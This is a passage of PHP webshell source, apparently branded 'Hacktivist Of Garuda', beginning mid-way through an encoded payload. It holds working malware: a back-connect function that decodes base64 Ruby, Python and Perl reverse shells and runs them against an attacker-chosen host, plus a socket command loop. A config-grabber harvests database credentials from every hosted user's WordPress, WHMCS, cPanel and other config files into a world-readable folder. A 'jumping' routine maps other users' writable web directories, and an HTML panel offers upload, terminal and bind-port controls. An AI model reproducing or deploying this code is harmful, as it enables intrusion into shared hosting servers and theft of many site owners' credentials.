nQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+IgoJCQkJCWVsc2UKCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZAoJCWVuZAoJcmVzY3VlIGVycm9yQnJvCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiCgllbnN1cmUKCQlzLmNsb3NlCgkJcyA9IG5pbAoJZW5kCmVsc2UKCXVzYWdlCglleGl0CmVuZA==");
			$bc = $func[86]('bcrb.rb', 'w');
			$func[87]($bc, $cont);
			$out = exe("ruby bcrb.rb $host $port");
			sleep(1);
			$res = "<pre>$out\n" . exe("ps aux | grep bcrb.rb") . "</pre>";
			$func[72]("bcrb.rb");
			return $res;
		} else if ($with == 'python') {
			$cont = $func[88]("IyEvdXNyL2Jpbi9weXRob24KI1VzYWdlOiBweXRob24gZmlsZW5hbWUucHkgSE9TVCBQT1JUCmltcG9ydCBzeXMsIHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKaXBsbyA9IHN5cy5hcmd2WzFdCnBvcnRsbyA9IGludChzeXMuYXJndlsyXSkKc29ja2V0LnNldGRlZmF1bHR0aW1lb3V0KDYwKQpkZWYgcHliYWNrY29ubmVjdCgpOgogIHRyeToKICAgIGptYiA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkKICAgIGptYi5zZW5kKCcnJ1xuUHl0aG9uIEJhY2tDb25uZWN0IEJ5IE51THo0MDRcblxuJycnKQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkKICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwyKQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykKICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCiAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgcHJpbnQgIlRpbU91dCIKICBleGNlcHQgc29ja2V0LmVycm9yLCBlOgogICAgcHJpbnQgIkVycm9yIiwgZQpweWJhY2tjb25uZWN0KCk=");
			$bc = $func[86]('bcpy.py', 'w');
			$func[87]($bc, $cont);
			$out = exe("python bcpy.py $host $port");
			sleep(1);
			$res = "<pre>$out\n" . exe("ps aux | grep bcpy.py") . "</pre>";
			$func[72]("bcpy.py");
			return $res;
		} else if ($with == 'perl') {
			$cont = $func[88]("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
			$bc = $func[86]('bcpl.pl', 'w');
			$func[87]($bc, $cont);
			$out = exe("perl bcpl.pl $host $port 1>/dev/null 2>&1 &");
			sleep(1);
			$res = "<pre>$out\n" . exe("ps aux | grep bcpl.pl") . "</pre>";
			$func[72]("bcpl.pl");
			return $res;
		} else {
			$sockfd = $func[89]($host, $port, $errno, $errstr);
			if ($errno != 0) {
				return "<pre>$errno : $errstr</pre>";
			} else if (!$sockfd) {
				return "<pre>Unexpected error has occured, connection may have failed.</pre>";
			} else {
				while (!$func[78]($sockfd)) {
					$user = exe('whoami');
					$pwd = exe('pwd');
					@$func[90]($sockfd, "$user@" . (!@$_SERVER["SERVER_ADDR"] ? ($func[49]("gethostbyname") ? @$func[40]($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) . "~$pwd > ");
					$command = $func[91]($sockfd, 1337);
					@$func[90]($sockfd, "\n" . exe($command) . "\n\n");
				}
				@$func[92]($sockfd);
			}
		}
	}
}

function getConfig() {
	global $func;
	global $dir;
	if ($func[12]("/etc/passwd")) {
		$passwd = $func[14]("/etc/passwd");
		if ($func[12]("nulz_config")) {
			return "<font style='color: #ff0000;'>Folder nulz_config already exist! Please delete it first to get configs!</font>";
		} else {
			$func[15]('nulz_config', 0777);
			$htc = $func[86]('nulz_config/.htaccess', 'w');
			$func[87]($htc, "Options all\nRequire None\nSatisfy Any");
			$func[32]('/(.*?):x:/', $passwd, $user_config);
			foreach ($user_config[1] as $user_con) {
				$user_config_dir = "/home/$user_con/public_html/";
				if ($func[9]($user_config_dir)) {
					$grab_config = [
						"/home/$user_con/.my.cnf" => "cpanel",
						"/home/$user_con/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_con/public_html/forum/config.php" => "phpBB",
						"/home/$user_con/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_con/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_con/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_con/public_html/admin/config.php" => "OpenCart",
						"/home/$user_con/public_html/application/config/database.php" => "Ellislab",
						"/home/$user_con/public_html/vb/includes/config.php" => "Vbulletin",
						"/home/$user_con/public_html/includes/config.php" => "Vbulletin",
						"/home/$user_con/public_html/forum/includes/config.php" => "Vbulletin",
						"/home/$user_con/public_html/forums/includes/config.php" => "Vbulletin",
						"/home/$user_con/public_html/cc/includes/config.php" => "Vbulletin",
						"/home/$user_con/public_html/inc/config.php" => "MyBB",
						"/home/$user_con/public_html/includes/configure.php" => "OsCommerce",
						"/home/$user_con/public_html/shop/includes/configure.php" => "OsCommerce",
						"/home/$user_con/public_html/os/includes/configure.php" => "OsCommerce",
						"/home/$user_con/public_html/oscom/includes/configure.php" => "OsCommerce",
						"/home/$user_con/public_html/products/includes/configure.php" => "OsCommerce",
						"/home/$user_con/public_html/cart/includes/configure.php" => "OsCommerce",
						"/home/$user_con/public_html/inc/conf_global.php" => "IPB",
						"/home/$user_con/public_html/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/wp/test/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/blog/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/beta/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/portal/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/site/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/wp/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/WP/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/news/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/wordpress/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/test/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/demo/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/home/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/v1/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/v2/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/press/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/new/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/blogs/wp-config.php" => "Wordpress",
						"/home/$user_con/public_html/configuration.php" => "Joomla",
						"/home/$user_con/public_html/blog/configuration.php" => "Joomla",
						"/home/$user_con/public_html/submitticket.php" => "^WHMCS",
						"/home/$user_con/public_html/cms/configuration.php" => "Joomla",
						"/home/$user_con/public_html/beta/configuration.php" => "Joomla",
						"/home/$user_con/public_html/portal/configuration.php" => "Joomla",
						"/home/$user_con/public_html/site/configuration.php" => "Joomla",
						"/home/$user_con/public_html/main/configuration.php" => "Joomla",
						"/home/$user_con/public_html/home/configuration.php" => "Joomla",
						"/home/$user_con/public_html/demo/configuration.php" => "Joomla",
						"/home/$user_con/public_html/test/configuration.php" => "Joomla",
						"/home/$user_con/public_html/v1/configuration.php" => "Joomla",
						"/home/$user_con/public_html/v2/configuration.php" => "Joomla",
						"/home/$user_con/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_con/public_html/new/configuration.php" => "Joomla",
						"/home/$user_con/public_html/WHMCS/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/whmcs1/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Whmcs/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/WHMC/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Whmc/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/whmc/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/WHM/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Whm/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/whm/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/HOST/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Host/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/host/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/SUPPORTES/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Supportes/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/supportes/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/domains/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/domain/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Hosting/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/HOSTING/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/hosting/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/CART/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Cart/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/cart/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/ORDER/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Order/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/order/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/CLIENT/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Client/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/client/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/support/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/BILLING/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Billing/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/billing/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/BUY/sumitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Buy/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/buy/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/MANAGE/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Manage/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/manage/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/ClientSupport/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Clientsupport/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/clientsupport/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/CHECKOUT/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Checkout/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/checkout/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/BASKET/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Basket/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/basket/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/SECURE/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Secure/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/secure/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/SALES/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Sales/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/sales/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/BILL/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Bill/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/bill/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/PURCHASE/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Purchase/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/purchase/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/ACCOUNT/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Account/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/account/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/USER/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/User/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/user/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/CLIENTS/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Clients/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/clients/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/MY/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/My/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/my/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/secure/whm/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/secure/whmcs/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/panel/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/clientes/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/cliente/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/support/order/submitticket.php" => "WHMCS",
						"/home/$user_con/public_html/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/boxbilling/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/box/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/host/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/Host/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/supportes/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/support/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/hosting/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/cart/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/order/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/client/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/clients/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/cliente/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/clientes/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/billing/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/billings/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/my/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/secure/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/support/order/bb-config.php" => "BoxBilling",
						"/home/$user_con/public_html/includes/dist-configure.php" => "Zencart",
						"/home/$user_con/public_html/zencart/includes/dist-configure.php" => "Zencart",
						"/home/$user_con/public_html/products/includes/dist-configure.php" => "Zencart",
						"/home/$user_con/public_html/cart/includes/dist-configure.php" => "Zencart",
						"/home/$user_con/public_html/shop/includes/dist-configure.php" => "Zencart",
						"/home/$user_con/public_html/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/hostbills/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/host/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/Host/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/supportes/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/support/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/hosting/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/cart/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/order/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/client/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/clients/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/cliente/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/clientes/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/billing/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/billings/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/my/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/secure/includes/iso4217.php" => "Hostbills",
						"/home/$user_con/public_html/support/order/includes/iso4217.php" => "Hostbills"
					];	
					foreach ($grab_config as $config => $nama_config) {
						$ambil_config = $func[14]($config);
						if ($ambil_config != '') {
							$file_config = $func[86]("nulz_config/$user_con-$nama_config.txt", "w");
							$func[90]($file_config, $ambil_config);
						}
					}
				}		
			}
			return "<font style='color: #00ff00;'>Success get config! Click <a href='?dir=$dir/nulz_config'>Here!</a></font>";
		}
	} else {
		return "<font style='color: #ffee00;'>Can't Read /etc/passwd</font>";
	}
}

function jumping() {
	global $func;
	if ($func[12]("/etc/passwd")) {
		$i = 0;
		$passwd = $func[14]("/etc/passwd");
		$func[32]('/(.*?):x:/', $passwd, $user_jumping);
		$table = '<div class="table-responsive"><table class="table table-hover"><thead><tr><th>#</th><th>Type</th><th>User</th><th>Domain</th></tr></thead><tbody>';
		foreach ($user_jumping[1] as $user_pro_jump) {
			$user_jumping_dir = "/home/$user_pro_jump/public_html";
			if ($func[9]($user_jumping_dir)) {
				$i++;
				$type = 'R';
				if ($func[8]($user_jumping_dir)) {
					$type = 'RW';
				}
				if ($func[49]('posix_getpwuid')) {
					$domain_jump = $func[14]("/etc/named.conf");
					if ($domain_jump == '') {
						$domain = "Can't get domain";
					} else {
						$func[32]("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach ($domains_jump[1] as $dj) {
							$user_jumping_url = $func[33](@$func[36]("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if ($user_jumping_url == $user_pro_jump) {
								$domain = $dj;
								break;
							} else {
								$domain = "Can't get domain";
							}
						}
					}
				} else {
					$domain = "Can't get domain";
				}
				$table .= "<tr><td>$i</td><td>$type</td><a href='?dir=$user_jumping_dir'><font style='color: #00ff00;'>$user_pro_jump</font></a><td></td><td>$domain</td></tr>";
			}
		}
		$table .= '</tbody></table></div>';
		if ($i == 0) {
			return "<font style='color: #ff0000;'>No Jumping Found!</font>";
		}
		return $table;
	} else {
		return "<font style='color: #ff0000;'>Can't Read /etc/passwd</font>";
	}
}

$scandir = $func[21]($dir);
?>
<!doctype html>
<html lang="en">

<head>
    <title><?= $shellName ?> Webshell</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
	<meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
        integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@500&display=swap" rel="stylesheet">
    <link rel="icon" href="https://nulz-archive.vercel.app/archive/nulz.ico" type="image/x-icon" />
    <meta name="description" content=".:<?= $shellName ?> Webshell:.">
</head>

<body class="bg-success">
    <div class="container-lg">

        <nav class="navbar navbar-light bg-dark"
            style="border: 1px solid #ffffff; color: #ffffff; border-radius: 15px;">
            <div class="container-fluid">
                <span class="text-start fw-bold"><?= $shellName ?></span>
                <span class="text-center text-danger fw-bold">Webshell<br><img src="<?= $logo ?>" alt="HG"
                        width="100"><br>Hacktivist Of Garuda</span>
                <span class="text-end fw-bold">Bypass 403</span>
            </div>
        </nav>

        <?php if (isset($_SESSION['message'])): ?>
        <div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show my-3" role="alert">
            <strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        <?php endif;
        clear(); ?>

        <div id="tool">
            <div class="bg-dark d-flex justify-content-center flex-column flex-wrap my-2"
                style="border: 1px solid #ffffff; color: #ffffff; border-radius: 15px;">
                <h5 class="text-center fw-bold my-2"><i class="fa fa-tools"></i> Tools</h5>
                <div class="mb-3 tool-btn d-flex justify-content-center flex-wrap">
                    <a href="<?=$_SERVER['PHP_SELF'];?>" class="m-1 btn btn-outline-light btn-sm fw-bold"><i class="fa fa-home"></i> Home</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#upload"
					role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i>
                        Upload</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#newfile"
                        role="button" aria-expanded="false" aria-controls="collapseExample"><i
                            class="fa fa-file-plus"></i>
                        New File</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#newfolder"
                        role="button" aria-expanded="false" aria-controls="collapseExample"><i
                            class="fa fa-folder-plus"></i> New Folder</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#jumping"
                        role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-link"></i>
                        Jumping</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#get-config"
                        role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-wrench"></i>
                        Get
                        Config</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#network"
                        role="button" aria-expanded="false" aria-controls="collapseExample"><i
                            class="fa fa-network-wired"></i> Network</a>
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#terminal"
                        role="button" aria-expanded="false" aria-controls="collapseExample"><i
						class="fa fa-terminal"></i>
                        Terminal</a>
                    <a href="?logout" class="m-1 btn btn-outline-light btn-sm fw-bold"><i class="fa fa-sign-out"></i> Logout</a>
                </div>
            </div>

            <div class="row">
                <div class="col-md-12">
                    <div class="collapse" id="upload" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6">
                                    <form action="" method="post" enctype="multipart/form-data">
                                        <div class="input-group">
                                            <input type="file" class="form-control" name="uploadfile[]"
                                                id="inputGroupFile04" aria-describedby="inputGroupFileAddon04"
                                                aria-label="Upload">
                                            <button class="m-1 btn btn-outline-light btn-sm fw-bold" type="submit"
                                                id="inputGroupFileAddon04">Upload</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="collapse" id="newfile" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6">
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label class="form-label fw-bold">File Name</label>
                                            <input type="text" class="form-control" name="filename"
                                                placeholder="File Name">
                                            <style>
                                            label {
                                                color: #ffffff;
                                            }

                                            input[type="text"] {
                                                border: 1px solid #ffffff;
                                            }
                                            </style>
                                        </div>
                                        <div class="mb-3">
                                            <label class="form-label fw-bold">File Content</label>
                                            <textarea class="form-control" rows="15" name="filecontent"></textarea>
                                        </div>
                                        <button type="submit"
                                            class="m-1 btn btn-outline-light btn-sm fw-bold">Create</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="collapse" id="newfolder" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6">
                                    <form action="" method="post">
                                        <div class="mb-3">
                                            <label class="form-label fw-bold">Folder Name</label>
                                            <input type="text" class="form-control" name="foldername"
                                                placeholder="Folder Name">
                                            <style>
                                            label {
                                                color: #ffffff;
                                            }

                                            input[type="text"] {
                                                border: 1px solid #ffffff;
                                            }
                                            </style>
                                        </div>
                                        <button type="submit"
                                            class="m-1 btn btn-outline-light btn-sm fw-bold">Create</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="collapse" id="network" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <div class="mb-3">
                                        <p style="color: #ffffff;" class="fw-bold">Bind Port</p>
                                        <label class="form-label fw-bold">Port</label>
                                        <input type="number" class="form-control" placeholder="8080" id="bind-port">
                                    </div>
                                    <button class="m-1 btn btn-outline-light btn-sm fw-bold" type="button"
                                        onclick="bindPort(this)">Bind</button>
                                </div>
                                <div class="col-md-6 mb-3">
                                    <div class="mb-3">
                                        <p style="color: #ffffff;" class="fw-bold">Back Connect</p>
                                        <label class="form-label fw-bold">Host</label>
                                        <input type="text" class="form-control" id="bc-host">
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">Port</label>
                                        <input type="number" class="form-control" placeholder="8080" id="bc-port">
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">With</label>
                                        <select name="with" id="bc-with" class="form-control">
                                            <option value="php">PHP</option>
                                            <option value="perl">Perl</option>
                                            <option value="python">Python</option>
                                            <option value="ruby">Ruby</option>
                                        </select>
                                    </div>
                                    <button class="m-1 btn btn-outline-light btn-sm fw-bold" type="button"
                                        onclick="backConnect(this)">Back Connect</button>
                                </div>
                                <div class="col-md-12" id="network-res"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="collapse" id="jumping" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="d-flex justify-content-center flex-wrap my-3">
                                        <button class="m-1 btn btn-outline-light btn-sm fw-bold"
                                            onclick="jumping(this)"><i class="fa fa-link"></i> Go Jumping</button>
                                    </div>
                                </div>
                                <div class="col-md-6" id="jumping-res"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="collapse" id="get-config" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="d-flex justify-content-center flex-wrap my-3">
                                        <button class="m-1 btn btn-outline-light btn-sm fw-bold"
                                            onclick="getConfig(this)"><i class="fa fa-wrench"></i> Get All
                                            Config</button>
                                    </div>
                                </div>
                                <div class="col-md-6" id="config-res"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="collapse" id="terminal" data-bs-parent="#tool">
                        <div class="card card-body bg-dark border-light mb-3">
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <label class="form-label fw-bold">Command</label>
                                    <input type="text" class="form-control" onchange="terminal(this)">
                                </div>
                                <div class="col-md-6">
                                    <div id="terminal-res" class="d-flex justify-content-center fw-bold"
                                        style="color: #00ff00;"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-md-12">
                <div class="card bg-dark border-light fw-bold">
                    <div class="card-body" style="color: #ffffff;">
                        <h5><i class="fa fa-server"></i> Server Information </h5>
                        <div class="table-responsive">
                            <table class="table text-nowrap" style="color: #ffffff;">
                                <tr>
                                    <td>Operating System</td>
                                    <td> : <?= $uname ?></td>
                                </tr>
                                <tr>
                                    <td>User / Group</td>
                                    <td> : <?= $uid ?>[<?= $user ?>] / <?= $gid ?>[<?= $group ?>]</td>
                                </tr>
                                <tr>
                                    <td>PHP Version</td>
                                    <td> : <?= $func[1]() ?></td>
                                </tr>
                                <tr>
